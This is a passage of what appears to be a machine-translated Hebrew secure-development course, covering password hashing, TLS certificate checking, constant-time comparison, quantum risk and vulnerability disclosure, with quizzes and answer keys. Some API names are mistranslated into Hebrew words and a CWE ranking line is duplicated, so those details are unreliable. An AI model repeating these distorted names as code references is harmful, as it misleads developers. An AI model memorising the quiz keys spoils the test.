2. לדרוש מהמבקש מפתח פרטי המוכיח את זהותו. SSH ו- HTTPS תומכים בכך. יתרון גדול של גישה זו הוא שבקצה השרת יש להקליט רק מפתח ציבורי, כך שבעוד שיושרה חשובה, סודיות המפתחות אינה קריטית כל כך. עם זאת, פעולה זו דורשת שהמשתמש יגדיר מפתח פרטי זה.

3. תומך בכניסה מבוססת סיסמה (לפחות באופן חלקי).

אם אתה מיישם את אפשרות 3, התומכת בכניסה מבוססת סיסמה (לפחות באופן חלקי), יש לך הרבה חברה. לסיסמאות יש בעיות ידועות רבות, אך הן בעיות ידועות. אם אתה הולך להשתמש בסיסמאות, לפחות בחלקו, אתה צריך לעשות את זה נכון.

**היזהר** מאחסון סיסמאות בצורה לא מאובטחת. מסד נתונים מלא בפרטי סיסמאות הוא יעד מפתה לתוקפים. בפועל, תוקפים רבים הצליחו להשיג מסדי נתונים של מידע הקשור לסיסמה (למשל, על ידי פריצה לשירות או רכישת גיבוי). יש לתכנן מערכת מאובטחת ** כך שהתוקפים לא יוכלו לנצל בקלות מסדי נתונים של סיסמאות בצד השרת, גם כאשר התוקפים מצליחים לאחזר עותק. הנה כמה גישות שלא **** עובדות:

* אחסון סיסמאות "ברור" (לא מוצפן). ברור שאם תוקף מקבל את הנתונים האלה, התוקף יכול להשתמש בכל הסיסמאות. **_אל תעשה את זה!_**

* גיבוב הסיסמאות (לדוגמה, עם MD5, SHA-1 או SHA-256). לתוקפים יש כלים שיכולים לנחש בכוח הזרוע מיליארדי סיסמאות, לבצע גיבוב של כולן ולהשוות אותן לערכים המגובבים, כך שזה לא מגן על הסיסמאות. **_אל תעשה את זה!_**

* גיבובים מלוחים לכל משתמש. פעולה זו משלבת את הסיסמה עם ערך אקראי למשתמש הנקרא "מלח", ולאחר מכן מבצעת גיבוב של השילוב. הבעיה היא שאלגוריתמי גיבוב מודרניים הם כל כך מהירים שהתוקפים עדיין יכולים לנחש מיליארדי סיסמאות ולעתים קרובות למצוא את סיסמת המשתמש. שוב, **_אל תעשה את זה!_**

אם אתה משתמש בסיסמאות לאימות נכנס, לצורך אבטחה **_עליך_** להשתמש בסוג מיוחד של אלגוריתם למטרה זו הנקרא אלגוריתם *גיבוב קריפטוגרפי מלוח לכל משתמש* . המונח "איטרציה" נקרא גם נגזרת מפתח. שלושה אלגוריתמים משמשים בדרך כלל כאלגוריתם גיבוב קריפטוגרפי מלוח לכל משתמש:

* **Argon2id**<br>אלא אם כן יש לך סיבה חזקה להשתמש במשהו אחר, זה האלגוריתם להשתמש בו היום. הוא חזק יחסית נגד התקפות מבוססות תוכנה וחומרה.

* **Bcrypt**<br>זהו אלגוריתם הגון נגד התקפות מבוססות תוכנה. זה לא כל כך קל לתקוף עם חומרה בהשוואה PBKDF2 (כי bcrypt דורש יותר RAM), אבל זה חלש יותר נגד התקפות מבוססות חומרה לעומת Argon2id.

* **PBKDF2**<br>זהו אלגוריתם הגון נגד התקפות מבוססות תוכנה, אך הוא הפגיע ביותר מבין האלגוריתמים הנפוצים הללו להתקפות מבוססות חומרה ממעגלים מיוחדים או מעבדים גרפיים. הסיבה לכך היא כי זה יכול להיות מיושם עם מעגל קטן זיכרון RAM קטן. ייתכן שלא תצטרך להחליף אותו (בהתאם לסוגי התוקפים המעסיקים אותך), אך כנראה שעדיף להימנע מכך עבור מערכות חדשות כיום.

אלגוריתם נוסף שנמצא בשימוש הוא scrypt. זה אמור להיות חזק גם נגד התקפות חומרה, אבל זה לא קיבל כל כך הרבה ביקורת בהשוואה ל- Argon2id, ולכן Argon2id מומלץ יותר. עם זאת, בזמן כתיבת שורות אלה, אין לו בעיות רציניות ידועות.

עליך לאפשר למשתמשים לדרוש שימוש באימות דו-שלבי (2FA), ישירות או על-ידי האצלה לשירות שעושה זאת.

כמו כן, היזהר מיישום אלגוריתמים אלה רק בצד הלקוח. זה בסדר ליישם אותם בצד הלקוח (כי זה מונע מהשרת לגלות אי פעם את הסיסמה שהמשתמש מזין), כל עוד הם ** מיושמים גם בשרת. הסכנה היא לעשות אותם *רק* על הלקוח; אם זה קורה, אז מה מאוחסן בשרת אינו שונה מאחסון סיסמאות ברור. ברגע שהתוקפים מקבלים את מסד הנתונים של הסיסמאות, הם יכולים פשוט ליצור או לשנות לקוח משלהם כדי להיכנס לחשבון של כל אחד.

>  שעת סיפור: דליפת נתונים של אשלי מדיסון
> אשלי מדיסון הוא שירות היכרויות מקוון מסחרי קנדי שנוסד בשנת 2002 ומשווק כמאפשר רמאות בבני זוג רומנטיים. בשנת 2015 התוקפים גנבו את נתוני הלקוחות שלה. סוגיות רבות נחשפו באותה נקודה; נתמקד באחד כאן. אשלי מדיסון השתמשה נכון בשגרת **ההצפנה** כדי לאחסן סיסמאות משתמשים. למרבה הצער, במקרים רבים הם *גם* אחסנו סיסמאות מקודדות באמצעות  אלגוריתם הגיבוב **MD5**, שאינו אלגוריתם מתאים לאחסון סיסמאות (כפי שצוין לעיל). התוקפים השתמשו בקודי Hash לא מוגנים אלה של סיסמאות MD5 כדי לפענח יותר מ-11 מיליון מהסיסמאות של חשבונות אלה תוך 10 ימים בלבד, מה שאפשר להם להיכנס לחשבונות אלה ("[פעם נתפסו כחסני כדורים, 11 מיליון+ סיסמאות אשלי מדיסון כבר נסדקו" מאת Dan Goodin, 2015](https://arstechnica.com/information-technology/2015/09/once-seen-as-bulletproof-11-million-ashley-madison-passwords-already-cracked/)).

#### חידון 3.5: אחסון סיסמאות

\>\>בחר את המשפטים הנכונים:<<

[!] באפשרותך לבטל את כל חששות האבטחה והפרטיות של האימות על-ידי האצלת אימות לשירות אחר. {{ נבחר: לא כך. ראשית, האם אתה יכול לסמוך על שירות אחר זה? אותו שירות אחר יידע מי אימת מתי; זה מקובל? במקרים רבים זו החלטה טובה להאציל סמכויות, אבל אתה צריך לשקול את ההשלכות. }}

[ ] דרך מאובטחת עבור שרת לאחסן סיסמאות לאימות נכנס היא לבצע גיבוב של הסיסמה באמצעות SHA-1. {{ נבחר: ממש לא, זו  גישה *לא בטוחה*. עליך להשתמש באלגוריתם שתוכנן במיוחד למטרה זו, כגון Argon2id. }}

[ ] PBKDF2 מאובטח יותר מ-Argon2id. {{ נבחר: לא, זו הדרך הלא נכונה. ל-Argon2id יש עמידות חזקה בהרבה להתקפות מבוססות חומרה מאשר ל-PBKDF2. }}

[x] Argon2id, bcrypt ו-PBKDF2 הם כולם אלגוריתמים נפוצים של גיבוב קריפטוגרפי מלוח לכל משתמש; מבין שלושת אלה, העדיפו את Argon2id אלא אם כן יש לכם סיבה לעשות אחרת.

### אבטחת שכבת תעבורה (TLS)

אבטחת שכבת התעבורה (TLS) היא פרוטוקול הצפנה הנמצא בשימוש נרחב כדי לספק אבטחה ברשת בין שני צדדים. הוא מספק פרטיות ויושרה בין אותם צדדים. TLS גרסה 1.3 שוחררה בשנת 2018. גרסה ישנה ולא מאובטחת של פרוטוקול זה נקראה Secure Sockets Layer (SSL), ולפעמים המונחים משמשים לסירוגין. כאשר **** אתה משתמש  https:// בדפדפן אינטרנט או בשרת כיום, אתה בדרך כלל משתמש ב- TLS (במקרים נדירים, ייתכן שאתה משתמש בקודמו הלא מאובטח, SSL). TLS משמש גם ביישומים אחרים, לדוגמה, כדי להגן על חילופי דואר אלקטרוני בין סוכני העברת דואר שונים (MTAs).

#### אימות אישורים

כדי להשתמש ב- TLS כראוי, צד השרת לפחות זקוק לאישור (כך שהוא יכול להוכיח ללקוחות פוטנציאליים שזו המערכת שהוא מתיימר להיות). באפשרותך ליצור אישור בעצמך ולהתקין את המפתח הציבורי שלו בכל לקוח (לדוגמה, דפדפן אינטרנט) שיתחבר לשרת זה. זה בסדר גמור לבדיקה, אבל ברוב המצבים האחרים, זה מסובך מדי. ברוב המקרים (למעט בדיקה) עליך לקבל אישור שהוקצה על-ידי רשות אישורים. אתה יכול לקבל אישורים בחינם מ [- Let's Encrypt](https://letsencrypt.org/). אם הדרישות של Let's Encrypt אינן מתאימות לצרכיך, רשויות אישורים אחרות עשויות להיות שימושיות עבורך.

כאשר לקוחות מתחברים לשרת באמצעות TLS, הלקוח בדרך כלל צריך לבדוק שהאישור חוקי. דפדפני אינטרנט כבר מזמן עבדו את זה; דפדפני אינטרנט מגיעים עם ערכה ניתנת להגדרה של מפתחות ציבוריים של רשות אישורים (ישירות או באמצעות מערכת ההפעלה) ומאמתים באופן אוטומטי כל חיבור TLS חדש.

*היזהר*: אם אתה משתמש בלקוח משלך, במקום להשתמש בדפדפן אינטרנט, בדוק שוב שאתה משתמש ב- API של ספריית TLS *כראוי*. ממשקי API רבים של ספריית  TLS *אינם* מאמתים באופן מלא את אישור ה- TLS של השרת באופן אוטומטי. לדוגמה, הם עשויים לאפשר חיבורים לשרת כאשר אין אישור שרת, הם עשויים לאפשר כל אישור (במקום אישור עבור האתר שאליו אתה מנסה להתחבר), או לאפשר אישורים שפג תוקפם. זוהי טעות נפוצה ביותר ([*הקוד המסוכן ביותר בעולם: אימות תעודות SSL בתוכנות שאינן דפדפן, *](https://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf)מאת מרטין גאורגייב, סובודה איינגאר, סומאן יאנה, רישיטה אנובהאי, דן בונה ויטלי שמאטיקוב, 2012). אם זהו המקרה, ייתכן שאתה משתמש ב- API של TLS ברמה נמוכה במקום ב- API שבו עליך להשתמש.

 אימות אישורים לא תקין הוא גורם כה נפוץ לפגיעויות אבטחה שהוא 2021 CWE Top 25 #26 ו- 2021 CWE Top 25 #26 ו- 2019 CWE Top 25 #25. הוא מזוהה כ- [CWE-295](https://cwe.mitre.org/data/definitions/295.html), *אימות אישורים לא תקין*.

#### צופן

TLS, כפרוטוקול, משלב רבים מהקטעים שדיברנו עליהם. בתחילת התקשורת, שני הצדדים חייבים לנהל משא ומתן כדי לקבוע את מערך האלגוריתמים (כולל אורכי מפתח) שישמשו לחיבור שלה. קבוצה זו של אלגוריתמים נקראת *הצופן*. משמעות הדבר היא שלמען האבטחה, חשוב שיהיו תצורות ברירת מחדל טובות ושהתוכנה תוגדר כראוי בעת פריסתה.

אם אתה מגדיר אתר HTTPS, מקום מצוין לקבלת ההגדרות המומלצות כרגע הוא [אתר ](https://wiki.mozilla.org/Security/Server_Side_TLS)האבטחה / צד השרת TLS[* של*](https://wiki.mozilla.org/Security/Server_Side_TLS)[ ](https://wiki.mozilla.org/Security/Server_Side_TLS) Mozilla. החלטה מרכזית שעליך לקבל היא אם אתה רוצה את התצורה המודרנית, הבינונית או הישנה:

* מודרני: מאובטח ביותר, אך מספר לא טריוויאלי של לקוחות לא יוכלו להתחבר אליו.

* ביניים: הגדרת פשרה המאפשרת ללקוחות מעט מבוגרים יותר להתחבר תוך מתן אבטחה טובה למדי.

* ישן: הגדרה המספקת את האבטחה הטובה ביותר האפשרית התומכת בלקוחות ובספריות ישנים בהרבה. האבטחה שלה חלשה בהרבה מבינונית.

בזמן כתיבת שורות אלה*, הגדרת הביניים * מומלצת ברוב המקרים, אך בדוק אם קיימים עדכונים באתר זה.

תבחין שלכל תצורה יש רשימה של צופן TLS לפי סדר עדיפות. לדוגמה, `TLS_AES_128_GCM_SHA256` המשמעות של TLS היא להשתמש בתקן ההצפנה המתקדם (AES) עם מפתח של 128 סיביות במצב Galois/Counter (GCM) בשילוב עם אלגוריתם הגיבוב המאובטח עם 256 סיביות (SHA-256).

לאחר פריסת המערכת, עליך לבדוק אותה. אם האתר גלוי לציבור, זה רעיון נהדר להשתמש בבדיקת Qualys החינמית שנקראת [בדיקת שרת SSL](https://www.ssllabs.com/ssltest/). זה נקרא בדיקת שרת SSL כי זה השם הישן עבור TLS, אבל אל תלך שולל, זה עובד טוב עם TLS (ויתלונן אם תאפשר את פרוטוקולי SSL פגיעים).

#### חידון 3.6: אבטחת שכבת התעבורה (TLS)

\>\>בחר את המשפטים הנכונים:<<

[!] אם אתה מפעיל ספריית TLS, סביר להניח שהיא מאמתת באופן מלא את אישור ה- TLS של השרת באופן אוטומטי. {{ נבחר: לא כך. ספריות רבות *אינן* מאמתות זאת באופן מלא, לדוגמה, ייתכן שהן לא יוודאו שהאישור מתאים למערכת נתונה. חלקם עושים זאת, אך בעת שימוש בספריית TLS שלא השתמשת בה בעבר, חשוב לבדוק מה היא מאמתת. }}

[x] דפדפני אינטרנט משתמשים ב- TLS או ב- SSL בעת התחברות לאתר חיצוני עם **כתובת URL** "https:".

[x] כאשר דפדפני אינטרנט יוצרים קשר עם שרת באמצעות TLS, הם משתמשים בקבוצה הניתנת להגדרה של מפתחות ציבוריים של רשות אישורים (הכלולים בדפדפן או מסופקים באמצעות מערכת ההפעלה).

[x] הגדרות שרת HTTPS מומלצות ניתן למצוא באתר "אבטחה / צד שרת TLS" של מוזילה.

### נושאים נוספים בקריפטוגרפיה

#### קבלת ייעוץ קריפטוגרפי

בקורס זה, ניסינו לתת כמה יסודות ומספיק מידע כדי ליישם אותם בנסיבות שונות. אולי החשוב ביותר, עם זאת, הם חתיכות המפתח של עצה: לא ליצור אלגוריתמים קריפטוגרפיים משלך או פרוטוקולים, ולא ליצור יישומים משלך. במקום זאת, השתמש שוב באלגוריתמים, פרוטוקולים ויישומים מכובדים היטב. בעת הגדרת התצורה של קריפטוגרפיה, חפש עצות עדכניות ומכובדות. דוגמאות למקורות כאלה כוללות [את אתר ה-TLS של אבטחה/צד השרת](https://wiki.mozilla.org/Security/Server_Side_TLS) של מוזילה, NIST (במיוחד ההמלצה של NIST [*לניהול מפתח: חלק 1 - כללי), *](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf)וקריפטוגרפיה של הדור הבא של[* CISCO*](https://tools.cisco.com/security/center/resources/next_generation_cryptography). קריפטוגרפים לא תמיד יסכימו על מה "הכי טוב" (כמו בכל תחום אחר), אבל מומחים יוכלו להצביע על מה שבור בבירור ומה מוסכם באופן נרחב להיות הרבה יותר בטוח.

#### אלגוריתמים של זמן קבוע

יש נושא חשוב שעדיין לא הזכרנו: אלגוריתמים של זמן קבוע, במיוחד השוואות של זמן קבוע. אלגוריתמים רבים לוקחים כמות משתנה של זמן בהתאם לנתונים שלהם. לדוגמה, אם ברצונך לקבוע אם שני מערכים שווים, בדרך כלל השוואה זו תיעצר בערך הלא שווה הראשון.

אלה שמפתחים ספריות הצפנה חייבים ליישם את האלגוריתמים שלהם כך שהזמן שהם לוקחים לא ישתנה בהתאם לנתוני הקלט שלהם (זה לא טריוויאלי, אם כי אפשרי, עם AES). רוב המפתחים מעולם לא לימדו איך לעשות את זה, אז זו אחת הסיבות הרבות שאתה לא צריך לכתוב ספריית הצפנה משלך. עם זאת, יש וריאציה שיכולה להתרחש לעתים קרובות מחוץ לספריות אלה: לפעמים אתה צריך לטפל בהשוואות מערכים במיוחד.

פעולות ההשוואה הרגילות (כגון **is-equal**) מנסות למזער את זמן הביצוע, וזה יכול לפעמים לדלוף מידע תזמון על הערכים לתוקפים. אם תוקף יכול לשלוח שוב ושוב נתונים ולהבחין שהשוואה של ערך המתחיל ב- "0" אורכת זמן רב יותר מערך שלא, אזי הערך הראשון שאליו הוא מושווה חייב להיות "0". לאחר מכן התוקף יכול לנחש שוב ושוב את הספרה השנייה, ואז את השלישית, וכן הלאה. מפתחים רבים מאמינים באופן שגוי כי לא ניתן לתוקפים לנצל וריאציות תזמון ברשת; זוהי אמונת שווא שהתוקפים אוהבים לנצל. הסטטיסטיקה המודרנית מתבררת כחזקה להפליא להסרת סטיות חביון; התוקפים באמת *יכולים* לנצל את העיכובים האלה.

*השוואות זמן קבוע* הן השוואות (בדרך כלל שוויון) שלוקחות את אותו הזמן, לא משנה אילו נתונים מסופקים להן. אלה אינם זהים לפעולות O(1) במדעי המחשב. דוגמאות לפונקציות השוואה קבועות אלה הן:

* צומת.js: **crypto.timingSafeEqual**

* רובי על מסילות**: תמיכה פעילה::אבטחהאוטילים secure_compare** fixed_length_secure_compare ****

* Java: **MessageDigest.equal** (בהנחה שאינך משתמש בגרסה עתיקה של ג'אווה)

בכל פעם שאתה משווה ערכים סודיים או ערכים קריפטוגרפיים (כגון מפתחות הפעלה), השתמש * בהשוואה של זמן קבוע* במקום בהשוואה רגילה, אלא אם כן התוקף אינו יכול לנצל את תזמון ההשוואה הרגיל. אינך צריך לעשות זאת עם גיבוב מלוח איטרטיבי המחושב בסביבה מהימנה (כגון השרת שלך), מכיוון שייקח לתוקף יותר מדי זמן ליצור את הערכים התואמים. עליך ** לעשות זאת אם אתה משווה ישירות מפתחות הפעלה לערך מאוחסן, מכיוון שתוקפים *יכולים* לפעמים לחזור על כך כדי להבין כל ספרה במפתח ההפעלה.

#### מזעור מפתחות הזמן/נתונים מפוענחים קיימים

זכור שלכל הפחות, אנו רוצים למזער את הזמן שבו הרשאה מסוימת פעילה. בקריפטוגרפיה, לעתים קרובות ברצונך למזער את הזמן שבו מפתח פרטי או סיסמה זמינים, או לפחות למזער את הזמן שבו הנתונים המפוענחים זמינים. זה יכול להיות קשה יותר ממה שאתה עשוי לחשוב. ברמת מערכת ההפעלה סביר להניח שתוכל לנעול אותו בזיכרון באמצעות **mlock() ** או **VirtualLock()**; פעולה זו לפחות תמנע העתקה של הנתונים לאחסון. באופן אידיאלי, היית מוחק אותו מהזיכרון לאחר השימוש, אם כי זה לעתים קרובות קשה באופן מפתיע. מהדרים עשויים להפוך קוד החלפה ל- no-op, מכיוון שהם מזהים ששום דבר לא קורא את הערכים המוחלפים. שפות עם איסוף אשפה מובנה לעתים קרובות בשקט לעשות עותקים נוספים ו / או לא מספקים מנגנון למחיקה. עם זאת, שפות או תשתיות מסוימות אכן הופכות זאת לקל. לדוגמה, אלה המשתמשים ב- .NET framework (לדוגמה, C#) יכולים להשתמש ב- SecureString.

#### מחשוב קוונטי

אחד הלא ידועים העתידיים הגדולים בקריפטוגרפיה הוא ההשפעה הפוטנציאלית של מחשבים קוונטיים למטרות כלליות. בזמן כתיבת שורות אלה, מחשבים  קוונטיים *למטרות כלליות* כביכול  קיימים, אך הם אינם חזקים מספיק כדי לאיים על אלגוריתמים קריפטוגרפיים נוכחיים. לא ידוע אם ניתן לבנות מחשבים קוונטיים חזקים יותר למטרות כלליות, ואם כן, מתי זה יקרה. אם ייבנו מחשבים קוונטיים חזקים לשימוש כללי, יש להם פוטנציאל לשבור את כל האלגוריתמים בעלי המפתח הציבורי הפופולריים בשנת 2020 באמצעות אלגוריתם שנקרא *האלגוריתם של שור*. כתוצאה מכך, חוקרים מפתחים אלגוריתמים חדשים בעלי מפתח ציבורי המתנגדים להתקפות ממחשבים קוונטיים כאלה, תחום שנקרא *קריפטוגרפיה פוסט-קוונטית*. בזמן כתיבת שורות אלה, אלגוריתמים רבים כאלה פותחו והם מוערכים.

לעומת זאת, אלגוריתמים קריפטוגרפיים סימטריים נוכחיים ופונקציות גיבוב מושפעים פחות ממחשבים קוונטיים. האלגוריתם של גרובר מאיץ התקפות נגד צפנים סימטריים, ומצמצם בחצי את אורכם האפקטיבי. משמעות הדבר היא ש-AES של 128 סיביות יכול להישבר על ידי מחשב קוונטי (אז הוא יהיה שווה ערך למפתח של 64 סיביות כיום), אבל AES של 256 סיביות עדיין יהיה מאובטח (הוא יהיה שווה ערך למפתח של 128 סיביות כיום). לכן, שימוש פשוט במפתחות ובגיבובים ארוכים יותר צפוי להיות מספיק בעולם פוסט-קוונטי עבור אלגוריתמים קריפטוגרפיים סימטריים ופונקציות גיבוב.

#### ענווה חשובה בקריפטוגרפיה

אולי הלקח החשוב ביותר כאן הוא להיות צנוע בעת שימוש בקריפטוגרפיה. אלגוריתמים קריפטוגרפיים רבים פותחו בעבר, רק כדי להישבר מאוחר יותר. זה היבריס לחשוב שלא ניתן לשבור את האלגוריתמים והפרוטוקולים הנוכחיים שלנו.

במקום זאת, צריכה להיות לך תוכנית לטיפול כאשר (לא אם) האלגוריתמים והפרוטוקולים הקריפטוגרפיים שלך שבורים. ודא שכל המפתחים השותפים שלך לומדים על תוכנית זו כדי שהם לא יהרסו אותה (למשל, אם אתה מפעיל פרויקט OSS, שים את זה בקובץ **CONTRIBUTING.md** או שווה ערך). בקיצור, תכננו שינוי.

באופן דומה, פנה לייעוץ ממומחים, ושקול עצה זו בקפידה. שגיאות במערכות הצפנה יכולות להיות הרסניות, ויכולות להימשך שנים רבות מכיוון שהן אינן ברורות. קבלת ביקורת ומשוב בונה של אחרים היא בדרך כלל רעיון טוב, אך היא חשובה במיוחד בעת שימוש בקריפטוגרפיה.

#### חידון 3.7: נושאים אחרים בקריפטוגרפיה

\>\>בחר את המשפטים הנכונים:<<

[!] תוקפים אינם יכולים לזהות השהיה בתוך שוויון ברשת.

[x] כאשר הדבר מעשי, עליך למזער את הזמן שבו נתונים מוצפנים בדרך כלל מפוענחים.

[ ] אם יפותחו מחשבים קוונטיים רבי עוצמה "למטרות כלליות", הם יהפכו את כל אלגוריתמי ההצפנה לחסרי תועלת. {{ נבחר: לא. מחשבים כאלה יהפכו  אלגוריתמים *נפוצים חסרי תועלת של מפתח ציבורי* הפופולריים  בשנת 2020. עם זאת, בעוד שהם יקצצו בחצי את אורך הסיביות האפקטיבי של אלגוריתמי הצפנה סימטריים, הם לא יהפכו אותם לחסרי תועלת; מפתח של 256 סיביות עבור אלגוריתם הצפנה סימטרי יהפוך למעשה למפתח של 128 סיביות, שעדיין מאובטח כראוי עבור רוב המטרות. בנוסף, מפותחים אלגוריתמים חדשים של מפתח ציבורי המתנגדים להתקפות ממחשבים קוונטיים כאלה. }}

# נושאים אחרים

פרק זה מתאר נושאים על יסודות פיתוח תוכנה מאובטחת שלא כוסו במקומות אחרים, כולל טיפול בגילויי פגיעויות, מקרי אבטחה, היסודות לאחר הפיתוח, שיטות רשמיות ורשימות פגיעויות מובילות.

מטרות הלמידה:

1. הבן כיצד לטפל כראוי בגילויי פגיעות.

2. דונו ביסודות של מקרי הבטחה.

3. דונו ביסודות שמעבר לפיתוח: הפצה, שטח/פריסה, תפעול וסילוק.

4. קבל מבוא קצר על שיטות רשמיות.

5. תסתכל על רשימות נקודות תורפה מובילות (למשל, OWASP Top 10 ו- CWE Top 25).

## גילויי פגיעות

### קבלת דיווחי פגיעות

למרבה הצער, גם לאחר מיטב המאמצים שלך, מישהו עלול למצוא פגיעות בתוכנה שפיתחת. ביחידה זו, נדון בקבלת דוחות פגיעות, כולל כיצד להתכונן לקבלת דוחות פגיעות *לפני* איתור פגיעויות.

#### צוותי תגובה לתקריות אבטחת מוצר (PSIRTs)

אם אתה חלק מצוות המפתח יישום תוכנה גדול בתוך ארגון יחיד, סביר להניח שיש לך או עליך לשקול להקים קבוצה שתטפל באירועי אבטחה הקשורים לתוכנה זו. צוותים כאלה נקראים לעתים צוות תגובה לתקריות אבטחת מוצר (PSIRT). הפורום ללא מטרות רווח של צוותי תגובה ואבטחה לתקריות (FIRST) מגדיר PSIRT כ*"ישות בתוך ארגון אשר... מתמקדת בזיהוי, הערכה וסילוק של הסיכונים הקשורים לפגיעויות אבטחה במוצרים, כולל הצעות, פתרונות, רכיבים ו/או שירותים שארגון מייצר ו/או מוכר"*  ([ראשון](https://www.first.org/standards/frameworks/):  מסגרת השירותים של צוות התגובה לתקריות אבטחת מוצר (PSIRT) * ומסגרת *השירותים של צוות התגובה לתקריות אבטחת מחשב (CSIRT)** ). FIRST ממליצה ליצור PSIRTs בזמן שהדרישות עדיין מפותחות, אך הן צריכות לפחות להיווצר לפני השחרור הראשוני של התוכנה. PSIRT הפועל כהלכה יכול לזהות דוח פגיעויות חמור ביותר ולהגיב לו במהירות.

PSIRTs עובדים לעתים קרובות עם צוותי תגובה לתקריות מחשב (CSIRTs); CSIRT מתמקד באבטחה של מערכות מחשב ו/או רשתות המרכיבות את התשתית של ארגון שלם, בעוד ש-PSIRTs מתמקדים במוצרים/שירותים ספציפיים. אם יש לך אחד (או שאתה רוצה להקים אחד), FIRST מספק מסגרות שימושיות המתארות מה PSIRTs ו- CSIRTs צריכים לעשות בתוך ארגון ([מסגרת שירותים ראשונה](https://www.first.org/standards/frameworks/)).

לממשלות רבות ולחברות גדולות יש גם דרישות והנחיות משלהן כיצד לטפל בדוחות פגיעות. אם הפרוייקט שלך הוא אחד המאמצים שלהם, יהיה עליך לעקוב אחר דרישות אלה ולשקול את ההנחיות שלו.

מדריך קצר ופשוט הוא [גיליון רמאות גילוי הפגיעות של OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html). מסמך קצר זה מספק הנחיות שימושיות הן לחוקרי אבטחה (שמוצאים פגיעויות אבטחה) והן לארגונים (שמקבלים דוחות פגיעות).

ישנם מסמכים שימושיים רבים אחרים הדנים בגילוי פגיעויות. בפרט:

* [*מדריך ה-CERT לחשיפת פגיעות מתואמת*](https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure), מאת אלן הומסטר, 2019. במסמך זה "הספק" הוא הארגון שמשחרר את התוכנה ועליו ללמוד על פגיעות האבטחה.

* הקווים המנחים והנהלים של FIRST לתיאום וגילוי[* *](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1)של [ פגיעות מרובת צדדים https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1)

קבוצת העבודה 'גילוי פגיעויות [של קרן האבטחה בקוד פתוח' (OpenSSF) ](https://github.com/ossf/wg-vulnerability-disclosures)
פיתחה [מדריך לחשיפת פגיעות מתואמת עבור פרויקטי תוכנה בקוד פתוח](https://github.com/ossf/oss-vulnerability-guide). אם אתה מתחזק פרוייקט OSS, החל מדריך זה כדי שתהיה מוכן לדוחות פגיעויות לפני שהם מתרחשים.


בהמשך יחידה זו נדון בכמה מהנושאים המרכזיים לקבלת דוחות פגיעות.

#### ציין בפומבי כיצד לשלוח דוחות פגיעויות

עליך לספר לאחרים, באופן פומבי, כיצד לשלוח דוחות פגיעות... ומידע זה חייב להיות קל מאוד למצוא. אחרת, כתבים פוטנציאליים לא ידווחו לך על פגיעויות, או שיהיה עיכוב משמעותי בזמן שהפרוייקט מנסה להבין כיצד לקבל דיווח. זהו זמן מבוזבז שבו הזמן הוא לעתים קרובות המהות. בשנת 2019, כישלון לציין בפומבי כיצד לשלוח דוחות פגיעויות היה הסיבה הנפוצה ביותר לכך שפרויקטים של OSS לא זכו בתג המעביר של OpenSSF ** Best Practices (יוזמת תשתית הליבה (CII) Best Practices Badge בשנת 2019[*, מאת דייוויד א. וילר).*](https://events19.linuxfoundation.org/wp-content/uploads/2018/07/cii-bp-badge-2019-03.pdf) 

במובן מסוים דרישה זו קלה. החלט מהי מוסכמת הדיווח שלך, והפוך את המידע הזה לקל לאיתור. הנה כמה מוסכמות נפוצות:

1. חברות ופרויקטים רבים תומכים בכתובת דואר אלקטרוני של הטופס **security@example.com** או **abuse@example.com**.

2. מוסכמה נפוצה בפרויקטים של OSS היא לספק מידע זה בקובץ בשם **SECURITY.md** בשורש המאגר או במסמכים**/** ספרייה. אתרים כגון GitHub ידגישו קובץ זה אם הוא קיים ויעודדו את יצירתם. הוסף קישור מקובץ **README.md** שלך  לקובץ **SECURITY.md** זה  .

3. אם הפרויקט כולל או מיישם אתר אינטרנט, המלצה נפוצה היא להוסיף  קובץ **אבטחה** .txt  באתר  בכתובת /security.txt ** או  /.**well-known/security.txt.**** לקבלת מידע נוסף, בקר בכתובת [securitytxt.org](https://securitytxt.org/).

אחד האתגרים הוא שהתוקפים גם מעוניינים מאוד לקבל דיווחים על פגיעויות, מכיוון שהם רוצים לנצל את הפגיעויות האלה עד שכולם יתקינו את התיקונים או ההקלות שלהן. לכן, בדרך כלל חשוב שיהיה מנגנון כלשהו לדיווח על פגיעויות שמונע מהתוקפים לקבל גם את המידע הזה לפני הפצת תיקון. לפעמים זה יכול להיות קשה לביצוע:

1. מערכות דואר אלקטרוני בדרך כלל אינן מוצפנות מקצה לקצה. מערכות דואר אלקטרוני התומכות בהצפנה מקצה לקצה (לדוגמה, OpenPGP ו- S/MIME) אינן נמצאות בשימוש נרחב, עשויות להיות קשות לשימוש ו/או נמצאות בשימוש בעיקר רק בקהילות ספציפיות.

2. מערכות תקשורת רבות אחרות לתקשורת מאובטחת של אחד על אחד מצפות שהצדדים כבר מכירים זה את זה, מה שלעתים קרובות אינו המקרה בדיווח על פגיעויות.

3. פרויקטים של OSS פועלים בדרך כלל בשטח פתוח, כך שפורומי דיווח ודיונים רגילים (כגון עוקבי בעיות, מערכות צ'אט וכו ') עשויים לאפשר לאנשים רבים (או לכולם) לראות את הדיון על פגיעות, גם אם היא לא אמורה להיות ידועה בציבור.

אם אינך מעוניין שהתוקפים ינצלו באופן מיידי פגיעויות שדווחו לך, עליך להשתמש בהצפנה כלשהי עבור הדיווח הראשוני. פתרון אחד לא מושלם אך שימושי הוא להשתמש במערכות דואר אלקטרוני התומכות ב- STARTTLS. רוב ספקי הדוא"ל הגדולים (כמו GMail) וחברות רבות תומכים ב- STARTTLS. STARTTLS מספק *הצפנת שכבת תעבורה, *כלומר, הודעות הדוא"ל מוצפנות *בין* ממסרי דואר אלקטרוני. הצפנת שכבת התעבורה אינה מאובטחת כמו הצפנה מקצה לקצה, מכיוון שהודעות הדוא"ל מפוענחות בנקודות שונות. בנוסף, STARTTLS נפרס לעתים קרובות כ- *TLS אופורטוניסטי -* כלומר תוקף פעיל השולט בנתבי רשת מסוימים או בממסרי דוא"ל עשוי להיות מסוגל להשבית הצפנה זו למשך פרק זמן מסוים. עם זאת, השימוש בספקי דוא"ל התומכים ב-STARTTLS מספק הגנה מפני רבים מסוגי ההתקפות הנפוצים ביותר על תקשורת, תוך שהוא קל מאוד לשימוש.

